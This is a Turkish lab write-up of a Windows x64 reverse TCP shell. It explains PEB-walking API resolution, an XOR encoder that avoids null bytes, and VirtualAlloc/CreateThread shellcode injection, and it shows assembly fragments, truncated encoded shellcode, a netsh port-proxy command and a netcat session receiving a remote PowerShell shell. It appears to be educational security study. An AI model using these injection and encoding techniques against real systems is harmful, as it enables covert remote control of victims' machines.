# Lab 05: Windows x64 Reverse TCP Shell & Custom Encoder/Runner Mimarisi

Bu laboratuvar çalışması, Windows x64 mimarisinde ham shellcode yürütme süreçlerini, kötü amaçlı karakter filtrelemeden (bad character avoidance) kaçınmak için geliştirilen dinamik anahtarlı XOR encoder mekanizmalarını ve süreç enjeksiyonu (`injector`) tekniklerini incelemektedir.

---

## Klasör İçeriği

| Dosya | Açıklama |
|---|---|
| **`injector.cpp`** | Bellekte yer ayırma (`VirtualAlloc`), yazma ve thread oluşturma (`CreateThread`) adımlarını yöneten ana enjektör programı. |
| **`rev_tcp_sh.asm`** | Windows x64 mimarisi için yazılmış, x32/x64 uyumlu ham Reverse TCP Shell payload assembly kodu. |
| **`sgn_encoder_markIII.cpp`** | Üretilen shellcode içindeki `0x00` (null byte) ve yasaklı karakterleri engellemek için dinamik anahtar üreten, null byte içeren anahtarları otomatik olarak elerken ekrana uyarı basıp yeniden deneme mekanizmasına sahip gelişmiş encoder. |
| **`sgn_runner_markIII.asm`** | Bellekte şifresi çözülen (decoded) payload'ı çalıştırmak için tasarlanmış x32/x64 uyumlu runner mimarisi. |

---

## Shellcode Mimarisi ve İncelemesi (`rev_tcp_sh.asm`)

Bu laboratuvarda kullanılan x64 Reverse TCP Shell kodu, harici bir API adresine bağımlı kalmamak (Position Independent) için kendi ihtiyaç duyduğu fonksiyonları çalışma zamanında işletim sisteminden dinamik olarak çözer.

### 1. Başlangıç ve Dinamik API Çözümleme (PEB Walking)
Shellcode, `VirtualAlloc` gibi bir yöntemle belleğe yerleştirildiğinde hiçbir kütüphanenin nerede olduğunu bilmez. Bu yüzden ilk adım, Windows işletim sisteminin her sürecin hafızasına yerleştirdiği **PEB (Process Environment Block)** yapısını kullanmaktır.

*   `gs:[0x60]` üzerinden PEB'e ulaşılır.
*   PEB üzerinden `Ldr` (Loader) yapısına ve oradan da belleğe yüklenmiş modüllerin listesine (`InMemoryOrderModuleList`) geçilir.
*   Bu liste üzerinde gezinilerek modül isimleri kontrol edilir (`cmp dword [rcx], 0x0045004B` - "KE" ve "RN") ve **`kernel32.dll`**'in bellekteki taban adresi (Base Address) bulunur.
*   `kernel32.dll` bulunduktan sonra, PE formatının parçası olan **Export Directory** (Dışa Aktarım Tablosu) ayrıştırılır. İsimler (AddressOfNames), ordinaller ve fonksiyon adresleri tabloları taranarak **`GetProcAddress`** fonksiyonunun adresi tespit edilir.

### 2. Sınırsız Erişim: GetProcAddress ve LoadLibraryA
`GetProcAddress` fonksiyonu bulunduktan sonra, shellcode'un işletim sistemindeki kilidi açılmış olur.
```assembly
    ; GETPROCADDRESS (KERNEL32 -> LOADLIBRARYA)
    lea     rdx, [rel str_loadlibrarya] ; rdx = "LoadLibraryA" VA
    mov     rcx, rbx                    ; rcx = kernel32.dll (Kernel Base VA)
    call    rdi                         ; GetProcAddress([kernel32.dll], "LoadLibraryA")
```
Bu çağrı ile `LoadLibraryA` elde edilir. **`GetProcAddress` ve `LoadLibraryA` elimizde olduğuna göre artık sistemdeki tüm kütüphanelere ve fonksiyonlara erişim sağlayabiliriz.** Örneğin, ağ bağlantısı kurmak için gereken Winsock kütüphanesi (`Ws2_32.dll`) `LoadLibraryA` ile yüklenir ve içindeki `WSAStartup` gibi fonksiyonlar `GetProcAddress` ile çözülür.

### 3. RIP-Relative Addressing (Konumdan Bağımsız Bellek Erişimi)
Yukarıdaki kodda yer alan `lea rdx, [rel str_loadlibrarya]` komutu kritik bir role sahiptir. Shellcode'un bellekte (RAM) hangi adrese enjekte edileceği önceden bilinemez. 

Eğer string ifadelerin (örneğin `"LoadLibraryA", 0`) mutlak adresleri kullanılsaydı kod çökerdi. `rel` (RIP-Relative) anahtar kelimesi kullanılarak, CPU'nun o an çalıştırdığı kodun adresi (Instruction Pointer - RIP) referans alınır ve string'in bu konuma olan uzaklığı hesaplanarak erişim sağlanır. Bu teknik, kodun %100 **PIC (Position Independent Code)** olmasını sağlar.

### 4. Ara Katmanlar: Ağ Bağlantısı ve Süreç Oluşturma (Payload Logic)
API adresleri çözüldükten sonra reverse shell mantığı işletilir:
*   **Ağ Hazırlığı:** `WSAStartup` ile soket kütüphanesi başlatılır, `WSASocketA` ile bir ağ soketi oluşturulur.
*   **Bağlantı:** `WSAConnect` kullanılarak hedeflenen IP adresi ve porta TCP bağlantı isteği gönderilir.
*   **Süreç Yönlendirme:** `CreateProcessA` çağrılmadan önce `STARTUPINFO` (si) yapısı ayarlanır. Bu yapının `hStdInput`, `hStdOutput` ve `hStdError` argümanlarına az önce oluşturulan ağ soketinin kulp değeri (handle) atanır. Bu sayede açılacak olan `powershell.exe`'nin tüm girdileri ve çıktıları saldıran makinedeki Netcat dinleyicisine yönlendirilmiş olur.

### 5. Temiz Çıkış (Clean Exit ve Stack Frame Restorasyonu)
Shellcode, enjekte edildiği sürecin (host process) işleyişini bozmamalıdır. Kodun en başında `push` ile yığına (stack) yedeklenen register'lar ve gölge alanı (shadow space), kodun sonunda titizlikle geri yüklenir:
```assembly
    ; stacki eski haline getir
    mov     rsp, rbp                   
    pop     rbp                        
    pop     rdi                        
    pop     rsi                        
    pop     rbx                        
    ret
```
Bu çıkış mekanizması (epilogue), shellcode işlevini tamamladığında akışın çökmeden, zarif bir şekilde asıl thread'e veya temiz bir çıkış döngüsüne dönmesini sağlar.

---

## Encoder Çalışma Mantığı ve Null Byte Koruması

Geliştirilen `sgn_encoder_markIII`, anahtar (key) üretimi sırasında shellcode içerisinde veya anahtarın kendisinde `0x00` byte oluşumunu engeller. Null byte içeren olası anahtarları çalışma anında tespit ederek dinamik olarak yeniden dener ve güvenli anahtar seçildiğinde kodlama işlemini tamamlar. Bu sayede C tarzı string kopyalama fonksiyonlarında (örneğin `strcpy`) payload'un kesilmesinin önüne geçilir.

### Örnek Encoder Çıktısı (Loglar):

```text
[!] key 0x9B icinde null byte uretti! yeniden deneniyor...
[!] key 0xB icinde null byte uretti! yeniden deneniyor...
[!] key 0xA icinde null byte uretti! yeniden deneniyor...
[!] key 0x2A icinde null byte uretti! yeniden deneniyor...
[!] key 0x68 icinde null byte uretti! yeniden deneniyor...
[!] key 0xE4 icinde null byte uretti! yeniden deneniyor...
[+] BASARILI ANAHTAR SECILDI: 0xB4
toplam byte sayisi: 632
[+] Encoded Shellcode:
0x51,0x03,0xFC,0x57,0x1F,0x1C,0xCE,0x9C,0x94,0xAD,0x48,0xDA,0x59,0xB9,0xB1,0x79, ...
```

---

## Bağlantı Testi (Reverse TCP Shell)

### Ağ Yönlendirmesi (Port Proxy)
Normal şartlarda WSL (Windows Subsystem for Linux) üzerinde çalışan bir Netcat, doğrudan Windows makinesine gelen portları dinleyemez. Laboratuvar ortamında Windows makinesi içinde oluşturulan bağlantı isteğini, WSL üzerindeki dinleyiciye yönlendirmek için PowerShell üzerinde aşağıdaki gibi bir **port proxy** ayarı yapılmıştır:

```powershell
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=127.1.1.1 connectport=4444 connectaddress=[wsl ip adresi]
```

Bu ayar sayesinde payload `127.1.1.1:4444` adresine bağlandığında, trafik doğrudan WSL ortamındaki dinleyiciye aktarılmaktadır.

### Netcat Dinleyici Çıktısı:

Encoder ile korunan ve runner vasıtasıyla bellekte çözülen shellcode çalıştırıldığında, hedef makineden dinlemedeki (listener) sunucuya başarılı bir şekilde PowerShell oturumu açmaktadır.

```bash
ataberk@ataberk-pc:~$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 172.29.16.1 54214
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Cannot load PSReadline module.  Console is running without PSReadline.
PS C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin> whoami
whoami
ataberk-pc\ataberk
PS C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin>
```
